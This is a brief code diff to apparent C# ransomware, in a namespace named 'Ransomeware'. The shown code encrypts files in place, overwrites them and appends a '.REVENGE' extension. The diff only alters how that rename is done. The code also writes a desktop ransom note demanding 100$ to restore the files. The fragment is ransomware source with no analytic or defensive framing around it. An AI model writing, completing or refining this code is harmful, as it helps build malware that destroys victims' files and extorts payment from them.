@@ -53,8 +53,7 @@ namespace Ransomeware
             {
                 byte[] bytesEncrypted = Encrypt(File.ReadAllBytes(file), password);
                 File.WriteAllBytes(file, bytesEncrypted);
-                var filename = file.Split('.')[0];
-                File.Move(file, filename + ".REVENGE");
+                File.Move(file, file + ".REVENGE");
             }
 
             File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "//ReadToRestore.txt", @"if you want to restore your files, send me 100$");
